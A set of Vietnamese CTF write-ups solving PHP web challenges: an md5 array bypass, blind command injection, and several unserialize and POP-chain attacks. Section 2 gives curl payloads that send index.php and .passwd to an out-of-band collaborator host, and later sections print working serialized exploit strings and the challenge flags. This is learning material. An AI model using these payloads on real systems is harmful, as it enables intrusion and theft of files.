# 1.Challenge 4 (Chết)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335086151_4272263046332618_3291264038354470674_n.png?stp=dst-png_s320x320&_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=F5g0bwHM-LMAX-imd-Y&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQAARdIJrfvtRkSDEpONy1-2eRzZjI-LPuKajmESPPgBQ&oe=6434CF39)

Ta thấy để lấy được `flag` thì phải bypass được qua 2 điều kiện:
+ Thứ nhất `$_GET[0] != $_GET[1]` ở đây là so sánh lỏng lẻo rằng 2 giá trị này không được giống nhau.
+ Thứ 2  `md5($_GET[0]) === md5($_GET[1])` ở đây là so sánh nghiêm ngặt rằng 2 giá trị md5 phải giống nhau.

Ở đây mình nhập query là `?0[] = 1&1[] = 2` vì ta thấy 2 giá trị đã khác nhau rồi và ở đây thì khi md5 một mảng thì bị lỗi nên khi md5 2 giá trị thì bằng nhau.

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335578993_173737468777050_8310854485055079719_n.png?_nc_cat=101&ccb=1-7&_nc_sid=aee45a&_nc_ohc=fg5E1FHU_4EAX-qDl8M&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSmcxWfu4TJEcEqGTFfrhTnKI2dGUDuMrEDWYW9Y7XkrA&oe=6434EB99)

# 2.Command injection - Filter bypass(Rootme)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335753941_210693378293101_1109877931538859121_n.png?stp=dst-png_p206x206&_nc_cat=103&ccb=1-7&_nc_sid=aee45a&_nc_ohc=iU8h3QC56hcAX-st81I&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSEcOXIuJle1cv69Myhf-tFKv0RuDp4aJWb60PGnNMqPg&oe=64356C7A)

Command injection là lỗ hổng bảo mật web cho phép kẻ tấn công có thể thực thi lệnh trên hệ thống của máy chủ.

Ban đầu mình gửi payload `127.0.0.1`:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335897818_588489449859050_4839548524305999563_n.png?stp=dst-png_p206x206&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=keFhUfeQ9oMAX_KrlCt&_nc_oc=AQkPn5UB6SAKv8P6U6b4vOK_rCyiX_XrqnLae6sUGImYccK5T8NDXn28HTyjXNJZ1FGiOydeUNRHSwanav1y_zr7&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSwD-NqFENOMS1of3MnKziLoHtwy8ztLkau8vN5dEMgJw&oe=6435704C)

Nhận được thông báo thành công,tiếp đến mình thử `127.0.0.1;ls` thì nhận được thông báo `syntax error`

Sau đó mình thử dùng `127.0.0.1%0Als` thì nhận được thông báo `Ping OK` những không xem được giá trị.

Sau khi có xem qua tài liệu mình thấy bài này là dạng `blind OS command injection using out-of-band`.Ở đây mình dùng `burp collaborator` khi đó payload có thể là `127.0.0.1%0Acurl https://swsvbeo1rm6k6hd6hp5yc2upogu7i76w.oastify.com`:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335768361_743205747460858_8772822659734854075_n.png?stp=dst-png_s480x480&_nc_cat=100&ccb=1-7&_nc_sid=aee45a&_nc_ohc=UgjNMJzUpJkAX-ix6Hz&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdT_gF29cHZO7NEj9YGHAj6ArWhuGWy9uhEb0oL-qEIHDQ&oe=64355537)

Nhận được thông báo `Ping OK` bây giờ mình cần đọc file `index.php` khi đó payload là `127.0.0.1%0Acurl -X POST -d @index.php  https://swsvbeo1rm6k6hd6hp5yc2upogu7i76w.oastify.com` trong đó @ tức là nội dung file:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335541736_5902579873129622_768741694859685983_n.png?stp=dst-png_s720x720&_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=kg-70BVkNEAAX-uIqRp&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRe_n5vS9RbXG9qfVCU5jhdqhROKKvLnSitsFbQpYN7ig&oe=643585DE)

Nhìn vào nội dung file mình thấy flag nằm ở file `.passwd`,tương tự mình cần đọc file `.passwd` payload sẽ là `127.0.0.1%0Acurl -X POST -d @.passswd https://swsvbeo1rm6k6hd6hp5yc2upogu7i76w.oastify.com`:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335438216_564583928779982_3167350078417986652_n.png?stp=dst-png_s600x600&_nc_cat=107&ccb=1-7&_nc_sid=aee45a&_nc_ohc=AR1fKKg0rMwAX-vlumM&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdQJQH2_cOZDlTbqjvWJkJm0AxIY4wUT__E4TNAnd8DDow&oe=64355CA7)

> Flag : Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!
# 3.Challenge 5(Chết)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335708250_576833774384308_153768854522696331_n.png?stp=dst-png_p206x206&_nc_cat=106&ccb=1-7&_nc_sid=aee45a&_nc_ohc=FKApj__d89AAX_xB_n_&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTBNAg5bYZdChX7wWUjsfXj4mieWoHx9DI-kKZoQ2Jubg&oe=6436B439)

Ta thấy thì hàm `simplexml_load_string` là chuyển một chuỗi XML thành đối tượng,vì thế ở chỗ `file_get_contents($inp)` mình phải truyền vào một file xml để khi `file_get_contents` thực thi thì nó sẽ return về một chuỗi XML.

Tiếp đến nó sẽ trỏ đến lần lượt từ thẻ `f->l->a->g`,vì ban đầu vị trí của nó là thẻ ở ngoài cùng nên mình cần một thẻ bao cả thẻ `f` để có thể trot đến `f`.cấu trúc XML có thể là:
```XML
<m>
    <f>
        <l>
            <a>
                <g>
                flagggggggggggggg
                </g>
            </a>
        </l>
    </f>
</m>
```

Bây giờ mình cần đưa file xml lên URL để có thể truyền vào qua biến `$inp`.
Ở đây mình dùng `pastebin`.

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/336014644_918156162860936_5010351030561427792_n.png?_nc_cat=101&ccb=1-7&_nc_sid=aee45a&_nc_ohc=zxXm0_XxNtkAX_lDer9&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRMQ5FHkbNWfu_j_szsGLxp6bmtmzHhZ3NQtF9yNHWW7A&oe=6436A2E0)

Tiếp đến mình cần truyền url cho biến `inp`,payload đầy đủ `https://xn--cht-8jz.vn/challenge/5/?inp=https://pastebin.com/raw/z7P27Wwe`:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335464445_738934251225889_8436482139477894897_n.png?_nc_cat=100&ccb=1-7&_nc_sid=aee45a&_nc_ohc=IifvCn3Wt9gAX8e1fT3&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSqDJ7unhYR7b0C_OvzOr17RPHnW0h_KSU65xlNsQ-48w&oe=6436B401)

> Flag: FLAG{19ee9d17-7f23-4c03-b702-4276246ccdb2}

# 4.PHP - Serialization(Root me)

![!image](https://scontent.xx.fbcdn.net/v/t1.15752-9/336002208_916474796140623_605560073880547236_n.png?stp=dst-png_p206x206&_nc_cat=104&ccb=1-7&_nc_sid=aee45a&_nc_ohc=chlFh-0oeNMAX-6Kfrk&_nc_oc=AQnnRa619H3fma9aArOckMhnDbiWDmrRdaq3CitA8-OoO1Yko-IkP7twkd7pGzvojRaAxTYjfc9JToK86l3r9RTS&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRMds7firUpL4_ry18RSkPHLPm4l74SPv287YV1o3hr4A&oe=64377477)

### PHP
```php
if(!isset($_SESSION['login']) || !$_SESSION['login']) {
    $_SESSION['login'] = "";
    // form posted ?
    if($_POST['login'] && $_POST['password']){
        $data['login'] = $_POST['login'];
        $data['password'] = hash('sha256', $_POST['password']);
    }
    // autologin cookie ?
    else if($_COOKIE['autologin']){
        $data = unserialize($_COOKIE['autologin']);
        $autologin = "autologin";
    }

    // check password !
    if ($data['password'] == $auth[ $data['login'] ] ) {
        $_SESSION['login'] = $data['login'];

        // set cookie for autologin if requested
        if($_POST['autologin'] === "1"){
            setcookie('autologin', serialize($data));
        }
    }
    else {
        // error message
        $message = "Error : $autologin authentication failed !";
    }
}
if(!empty($message))
    echo "<p><em>$message</em></p>";

// admin ?
if($_SESSION['login'] === "superadmin"){
    require_once('admin.inc.php');
}
// user ?
elseif (isset($_SESSION['login']) && $_SESSION['login'] !== ""){
    require_once('user.inc.php');
}
```
Nhìn vào code chúng ta thấy ở chỗ check password đang được so sánh lỏng lẻo
```php
   if ($data['password'] == $auth[ $data['login'] ] ) {
```
Chỗ này mình có thể tấn công vào và `$data` thì được gán giá trị từ input đầu vào hoặc từ `unserialize($_COOKIE['autologin'])`.

Sau khi đăng nhập bằng tài khoản `guest:guest` mình check cookie thì nhận được giá trị của `autologin`:
```php
a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A5%3A%22guest%22%3Bs%3A8%3A%22password%22%3Bs%3A64%3A%2284983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec%22%3B%7D
```

Và mình dùng `cyberchef` để decode nó:

```php
a:2:{s:5:"login";s:5:"guest";s:8:"password";s:64:"84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec";}
```
Bây giờ mình cần chỉnh giá trị `autologin` sao cho khi `unserialize` bypass được password.

Trước tiên mình thấy tài khoản administrator là `superadmin`.
Và để bypass được chỗ check password thì mình cần truyền giá trị `$data['password']` là `true` vì `true == string`.

Payload có thể là
```php
a%3A2%3A%7Bs%3A5%3A%22login%22%3Bs%3A10%3A%22superadmin%22%3Bs%3A8%3A%22password%22%3Bb:1%3B%7D
// a:2:{s:5:"login";s:10:"superadmin";s:8:"password";b:1}
```
`b:1` là sử dụng giá trị True cho password.

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335880355_170034572511328_2068206015517629175_n.png?_nc_cat=102&ccb=1-7&_nc_sid=aee45a&_nc_ohc=lA0sAI5OBn0AX8ExKEq&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSBeh9E8PZU5P6QUerzrJ5hQOw_Z2Gfc16YVAIOh5GKxQ&oe=64375A30)

> Flag : NoUserInputInPHPSerialization!

# 5.Level20(WebSec)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335643992_657122946222772_1840212946392046696_n.png?stp=dst-png_s1080x2048&_nc_cat=111&ccb=1-7&_nc_sid=aee45a&_nc_ohc=xLsTRWEN88YAX_L-8ql&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSCJRYlMtjYKR9kSlRNKV-OvTtL40UM5YojM1v-E6ogfA&oe=643765ED)

### Php
```Php
<?php

include "flag.php";

class Flag {
    public function __destruct() {
       global $flag;
       echo $flag; 
    }
}

function sanitize($data) {
    /* i0n1c's bypass won't save you this time! (https://www.exploit-db.com/exploits/22547/) */
    if ( ! preg_match ('/[A-Z]:/', $data)) {
        return unserialize ($data);
    }

    if ( ! preg_match ('/(^|;|{|})O:[0-9+]+:"/', $data )) {
        return unserialize ($data);
    }

    return false;
}

$data = Array();
if (isset ($_COOKIE['data'])) {
    $data = sanitize (base64_decode ($_COOKIE['data']));
}

if (isset ($_POST['value']) and ! empty ($_POST['value'])) {
    /* Add a value twice to remove it from the list. */
    if (($key = array_search ($_POST['value'], $data)) !== false) {
        unset ($data[$key]);
    } else { /* Else, simply add it. */
        array_push ($data, $_POST['value']);
    }
    setcookie ('data', base64_encode (serialize ($data)));
}

?>
```

Mình thấy thì có một class `Flag` và có một phương thức `__destruct` nó sẽ in ra màn hình flag cho mình.

Ở trong function `sanitize` có sử dụng `unserialize` nên mình có thể chèn `serialize` ở đây để gọi đối tượng `Flag`.

Để gọi hàm `sanitize` mình cần phải có `$_COOKIE['data']` và khi truyền vào `sanitize` data đã được `base64_decode` nên mình cần gửi payload `base64-encode`.

Payload có thể là 
```php
Tzo0OiJGbGFnIjowOnt9
// O:4:"Flag":0:{}
```
Khi chạy vào hàm `sanitize` mình cần bypass hàm `preg_match`,
`if` đầu tiên check các ký tự từ A-Z nên khó vượt qua vì mình phải gọi đến đối tượng `Flag`.
`if` thứ 2 thì không được match `O:[0-9]+:` và ở đây thì mình có gọi đối tượng là `O:4` nên cũng vượt qua được.
Sau khi tìm tài liệu thì mình thấy có thể thay thế `O` là `C` khi đó payload sẽ là:
```php
Qzo0OiJGbGFnIjowOnt9
// C:4:"Flag":0:{}
```

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/336376018_1145506886064258_6181906776892628204_n.png?_nc_cat=101&ccb=1-7&_nc_sid=aee45a&_nc_ohc=lSGlkcZGusQAX-5cgUm&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTxn1WOu1AXZAtYHTInZO0HFKD4H3Di_83jM25ATFlyvw&oe=643786EF)

> Flag : WEBSEC{CVE-2012-5692_was_a_lof_of_phun_thanks_to_i0n1c_but_this_was_not_the_only_bypass}

# 6.PHP - Unserialize Pop Chain(Root me)

```Php
<?php
 
$getflag = false;
 
class GetMessage {
    function __construct($receive) {
        if ($receive === "HelloBooooooy") {
            die("[FRIEND]: Ahahah you get fooled by my security my friend!<br>");
        } else {
            $this->receive = $receive;
        }
    }
 
    function __toString() {
        return $this->receive;
    }
 
    function __destruct() {
        global $getflag;
        if ($this->receive !== "HelloBooooooy") {
            die("[FRIEND]: Hm.. you don't see to be the friend I was waiting for..<br>");
        } else {
            if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
            }
        }
    }
}
 
class WakyWaky {
    function __wakeup() {
        echo "[YOU]: ".$this->msg."<br>";
    }
 
    function __toString() {
        global $getflag;
        $getflag = true;
        return (new GetMessage($this->msg))->receive;
    }
}
 
if (isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}
 
if (isset($_POST["data"]) && !empty($_POST["data"])) {
    unserialize($_POST["data"]);
}
 
?>
```
![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/336028627_142122655447471_5436558228034084539_n.png?stp=dst-png_p206x206&_nc_cat=110&ccb=1-7&_nc_sid=aee45a&_nc_ohc=Bu067bm3uG8AX-C5o2Z&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdT8LO_LWkp6K2HHULr3hBbMZ2KiwLVKMZr5JqzZ4HdeMA&oe=6437C182)

Ta thấy thì sau khi submit gửi data thì nó sẽ chạy vào `unserialize`.

```Php
 if ($getflag) {
                include("flag.php");
                echo "[FRIEND]: Oh ! Hi! Let me show you my secret: ".$FLAG . "<br>";
}
```

Mình cần truyền data vào sao cho nó echo được `FLAG` và ở đây có:
+ điều kiện đầu  tiên là mình phải cho `$getflag = true` và để `&getflag = true` thì mình phải gọi được đến hàm `__toString` của class WakyWaky.
    + Để gọi được method `__tostring` mình cần phải echo đối tương `WakyWaky`.Vậy nên ở chỗ `echo $this->msg` mình có thể gán đối tượng `WakyWaky` cho biến msg
    ```Php
    $waky1 = new WakyWaky();
    $waky2 = new WakyWaky();
    $waky2->msg = $waky1;
    $se = serialize($waky2);
    echo $se;
    <!-- O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":0:{}} -->
    ```
    Mình gửi payload này lên thì nhận được:
    ```txt
    [YOU]:
    [FRIEND]: Hm.. you don't see to be the friend I was waiting for..
    ```
Đến đây chúng ta thấy nó đã chạy vào `__destruct` và vì `$receive` lúc này của chúng ta đang là `null !== "HelloBooooooy"`.
Tuy nhiên nếu chúng ta truyền `HelloBooooooy` vào thì nó sẽ bị die ở method `__contruct` 

```Php
$message = new GetMessage("a");
// Khởi tạo đối tượng Getmessage
// Lúc này $receive = a
$message->receive = "HelloBooooooy" ;
// Lúc này mình gán lại giá trị cho $receive = "HelloBooooooy" mà không cần gọi đến method '__contruct'
```

Kêt hợp lại ta được:
```Php
$message = new GetMessage("a");
$message->receive = "HelloBooooooy" ;
$waky1 = new WakyWaky();
$waky1->msg = $message;
$waky2 = new WakyWaky();
$waky2->msg = $waky1;
$se = serialize($waky2);
echo $se;
// O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}
```
Gửi payload: `O:8:"WakyWaky":1:{s:3:"msg";O:8:"WakyWaky":1:{s:3:"msg";O:10:"GetMessage":1:{s:7:"receive";s:13:"HelloBooooooy";}}}`

Nhận được flag:

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/336153498_249468674081357_3460841333406106210_n.png?_nc_cat=108&ccb=1-7&_nc_sid=aee45a&_nc_ohc=BAVH5GmM1E0AX82M8-o&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdTBVZEeNvddcp2ekXpgnluJm3TMIsy7amdJKZr7CCw92A&oe=6437E7A1)
> Flag: uns3r14liz3_p0p_ch41n_r0cks

# 7. Challenge 10 (Chết)

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335845052_765086255019549_4644634981546577279_n.png?stp=dst-png_s206x206&_nc_cat=103&ccb=1-7&_nc_sid=aee45a&_nc_ohc=wcAbHAwwYMoAX9uqbvY&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdRMZbpoJXNVNpeXJyWBHMsTHCSdsjxYpEhXfXhgZ7LrCQ&oe=6439386A)

[https://github.com/php/php-src/blob/php-7.4.33/main/php_variables.c#L68](https://github.com/php/php-src/blob/php-7.4.33/main/php_variables.c#L68)
Ta thấy thì ở đấy nếu chúng ta  gửi `?get_flag.php=abc` thì khi đó php sẽ phân tích cú pháp này thành `$GET[get_flag_php]=abc` do php đã replace `.` thành `_` trong trường hợp này.
#### Php
```Php
/* ensure that we don't have spaces or dots in the variable name (not binary safe) */
for (p = var; *p; p++) {
    if (*p == ' ' || *p == '.') {
        *p='_';
    } else if (*p == '[') {
        is_array = 1;
        ip = p;
        *p = 0;
        break;
    }
}
```

Nếu gặp ký tự `[` thì nó sẽ break luôn vòng for mà không check tiếp nữa.Tuy nhiên bây giờ thì nên thay `[` ở đâu.

Và sau khi lướt xuống 1 chút thì ta thấy nếu có ký tự `[` thì nó sẽ bị chuyển đổi thành `_`:
```Php
    /* PHP variables cannot contain '[' in their names, so we replace the character with a '_' */
    *(index_s - 1) = '_';

    index_len = 0;
    if (index) {
        index_len = strlen(index);
    }
    goto plain_var;
    return;
```

Khi đó ta variable thỏa mãn được sẽ `get[flag.php` vì sau khi phân tích cú pháp nó sẽ check đến ký tự `[` dừng và sau đó chuyển ký tự `[` thành `_`.

Bây giờ mình cần `serialize` đối tượng `Get_Flag` và sau đó `__destruct` được gọi và in flag.
Tuy nhiên trước khi gọi hàm `__destruct` thì khi `unserialize` nó đã gọi đến `__wakeup` và set `$get=false` vì thế chỗ `__destruct` sẽ không in gì cả.
Mình cần hàm `unserialize` sao cho nó không gọi hàm `__wakeup`,sau khi có tìm hiểu vài tài liệu thì có 1 cách đó là thay thế `O` bằng `C` là sẽ không gọi hàm này.
[https://bugs.php.net/bug.php?id=81151](https://bugs.php.net/bug.php?id=81151)

Bây giờ payload sẽ là `?get[flag.php=C:8:"Get_Flag":0:{}`

![image](https://scontent.xx.fbcdn.net/v/t1.15752-9/335938870_2320856524756437_1522462436298815693_n.png?_nc_cat=109&ccb=1-7&_nc_sid=aee45a&_nc_ohc=W87eC_BPzFEAX83bsXT&_nc_oc=AQlwD5NYO2Ld2pMrvc-IOJ-5t9MDNR930O316KTqVT-OqSB6AL18DFR71ue5KSEJiDdbLfxytijtwDJrR91C588e&_nc_ad=z-m&_nc_cid=0&_nc_ht=scontent.xx&oh=03_AdSfbPnUk5fFfhnzTWfpOfFS8cUI9sw6kFQHvvijRe1xNw&oe=643944ED)

>Flag: FLAG{e4bd6b96-9c8b-4b30-8ffc-7ba57770c123}




